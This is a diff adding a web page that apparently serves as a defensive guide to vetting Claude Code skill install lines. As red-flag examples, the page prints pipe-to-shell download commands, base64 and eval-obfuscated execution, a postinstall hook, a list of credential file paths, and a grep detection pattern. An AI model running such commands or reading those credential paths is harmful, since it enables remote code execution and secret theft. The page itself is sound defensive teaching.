@@ -1,0 +1,119 @@
+<section class="hero">
+  <div class="kick eye">Claude Code · Skill Supply Chain</div>
+  <h1 class="disp">Don't install another Claude skill,<br>until you can read the install line<span class="dot">.</span></h1>
+  <p class="sub">A skill is not an app. <code>SKILL.md</code> is an instruction file your agent reads and follows, and most skills ship an install line that runs on your machine, as you, with your keys — before Claude does anything. On ClawHub, the only agent-skill hub anyone has published an audit of, Koi Security counted 341 malicious skills out of 2,857 — almost 1 in 8. Two steps stop most of it: pick the skill with <code>find-skills</code> instead of browsing, then read the install line for four red flags. Thirty seconds. Every figure below was read from its own source on 21 August 2026.</p>
+  <div class="actions">
+    <a class="btn primary" href="#flags">The four red flags ↓</a>
+    <a class="btn" href="#thirty">The grep line →</a>
+    <a class="btn" href="./files/no-038/skill-red-flags.md">Download the checklist (.md) &darr;</a>
+    <button class="btn" id="shareBtn" type="button">Send to whoever installs skills off GitHub unopened</button>
+  </div>
+  <div class="rule" aria-hidden="true">////////////////////////////////////////////////////////////////////////////////////////////////</div>
+</section>
+
+<!-- ======================= STEP ONE ======================= -->
+<div class="fig">
+  <h2 class="kick">Fig. 01 ·</h2>
+  <span class="gaccent">pick it before you audit it</span>
+  <span class="line"></span>
+</div>
+
+<section class="issues" id="pick">
+  <p class="note">Auditing is step two. Step one is not browsing a directory of 23,600+ skills and guessing.</p>
+  <div class="snippet">
+    <div class="bar"><span class="f">claude code · marketplace</span><button class="snipbtn" type="button" data-copy-target="#snipFind" data-copy-event="copy-install">Copy</button></div>
+    <pre id="snipFind">/plugin marketplace add vercel-labs/find-skills</pre>
+  </div>
+  <p class="meta">Then describe the job — “I need something that reviews my SQL migrations” — and it fetches the skill that fits. <code>find-skills</code> is the most-installed skill in the largest directory: <b>3M installs</b>, read from claudemarketplaces.com on 21 August 2026. Pick it, then read it.</p>
+</section>
+
+<!-- ======================= THE FOUR RED FLAGS ======================= -->
+<div class="fig">
+  <h2 class="kick">Fig. 02 ·</h2>
+  <span class="gaccent">the install line, before it runs</span>
+  <span class="line"></span>
+</div>
+
+<section class="issues" id="flags">
+
+  <article class="issue">
+    <h3><span class="num">1.</span> A pipe straight into a shell</h3>
+    <p>You never see what runs. The server can serve one thing to a browser and another to <code>curl</code>, so “I checked the URL” proves nothing. It also runs as you — same file access, same keys, same tokens.</p>
+    <div class="snippet">
+      <div class="bar"><span class="f">install line · red flag</span></div>
+      <pre id="snipFlag1">curl -fsSL https://example.com/install.sh | bash
+wget -qO- https://example.com/i.sh | sh
+iwr -useb https://example.com/i.ps1 | iex</pre>
+    </div>
+    <p class="meta"><b>What good looks like:</b> the skill tells you to download the script, then run it as a separate step. Two commands instead of one is the whole difference.</p>
+  </article>
+
+  <article class="issue">
+    <h3><span class="num">2.</span> Anything base64 (or hex, or <code>eval</code>)</h3>
+    <p>There is no legitimate reason for an install step to hide what it says. Encoding is there to get a payload past your eyes and past a reviewer's <code>grep</code>.</p>
+    <div class="snippet">
+      <div class="bar"><span class="f">install line · red flag</span></div>
+      <pre id="snipFlag2">echo aGVsbG8gd29ybGQ= | base64 -d | bash
+eval "$(printf '\x63\x75\x72\x6c ...')"
+python -c "exec(__import__('base64').b64decode('...'))"</pre>
+    </div>
+    <p class="meta"><b>What good looks like:</b> decode it before you decide — <code>base64 -d</code> on its own, with no pipe into a shell.</p>
+  </article>
+
+  <article class="issue">
+    <h3><span class="num">3.</span> A post-install hook</h3>
+    <p>It runs on <code>npm install</code> / <code>pip install</code> without you typing anything. You think you're fetching a dependency; you're executing the author's code. This is the single most-used route in real package-ecosystem attacks.</p>
+    <div class="snippet">
+      <div class="bar"><span class="f">package.json</span></div>
+      <pre id="snipFlag3">"scripts": { "postinstall": "node ./scripts/setup.js" }</pre>
+    </div>
+    <p class="meta"><b>What good looks like:</b> setup you invoke yourself, after you've read it.</p>
+  </article>
+
+  <article class="issue">
+    <h3><span class="num">4.</span> Anything reaching for credentials</h3>
+    <p>A skill that formats your commits has no business reading your SSH keys. Credential paths in an install script are the payload, not a feature. Pair this with any outbound request and you are looking at exfiltration.</p>
+    <div class="snippet">
+      <div class="bar"><span class="f">install line · red flag</span></div>
+      <pre id="snipFlag4">~/.ssh/id_rsa      ~/.ssh/id_ed25519     ~/.aws/credentials
+~/.config/gh/hosts.yml                   ~/.npmrc
+security find-generic-password           # macOS keychain
+~/.config/gcloud/                        .env</pre>
+    </div>
+  </article>
+</section>
+
+<!-- ======================= THE THIRTY-SECOND PASS ======================= -->
+<div class="fig">
+  <h2 class="kick">Fig. 03 ·</h2>
+  <span class="gaccent">the thirty-second pass</span>
+  <span class="line"></span>
+</div>
+
+<section class="issues" id="thirty">
+  <p class="note">Open <code>SKILL.md</code> and any install script it points at, then:</p>
+  <div class="snippet">
+    <div class="bar"><span class="f">terminal · the grep line</span><button class="snipbtn" type="button" data-copy-target="#snipGrep" data-copy-event="copy-install">Copy</button></div>
+    <pre id="snipGrep">grep -nEi 'curl|wget|\| *(ba)?sh|iex|base64|eval|exec\(|postinstall|preinstall|\.ssh|credentials|keychain|\.npmrc|\.env' SKILL.md install.sh</pre>
+  </div>
+  <p class="meta">Nothing back? Install it. Something back? Read that line and decide — some are fine in context (a skill that <i>is</i> a deploy tool will legitimately touch credentials, and should say so in plain words at the top). The rule that survives every case: <b>if the install step hides what it does, that is the finding.</b> You do not need to prove intent.</p>
+</section>
+
+<!-- ======================= SOURCING ======================= -->
+<div class="fig">
+  <h2 class="kick">Fig. 04 ·</h2>
+  <span class="gaccent">where every number came from</span>
+  <span class="line"></span>
+</div>
+
+<section class="issues" id="sourcing">
+  <p class="note">Every quantity on this page and in the film was independently read from its own source on <b>21 August 2026</b>.</p>
+  <article class="issue">
+    <h3>The numbers</h3>
+    <p><b>23,600+ Claude skills indexed</b> — claudemarketplaces.com/skills. <b>3M installs</b> for <code>find-skills</code>, the most-installed skill in that directory — same source. <b>472 malicious skills flagged</b> on ClawHub — SlowMist's MistEye threat intelligence, published 9 February 2026, corroborated by the detector set in github.com/smartchainark/skill-security-audit, which is built on it. <b>341 malicious of 2,857 total (11.9%, “almost 1 in 8”)</b> on ClawHub — Koi Security.</p>
+  </article>
+  <article class="issue">
+    <h3>Read this caveat</h3>
+    <p>ClawHub is the skill hub for OpenClaw. It is the hub that got audited, and the almost-1-in-8 rate is <b>its</b> rate. Nobody has published an equivalent audit of the Claude skills directory, so that figure is <b>not a measured rate for the skills you install</b> — it is the best evidence anyone has about what an unaudited agent-skill hub looks like when someone finally looks. Treat it as a reason to check, not as a statistic about Claude.</p>
+  </article>
+</section>
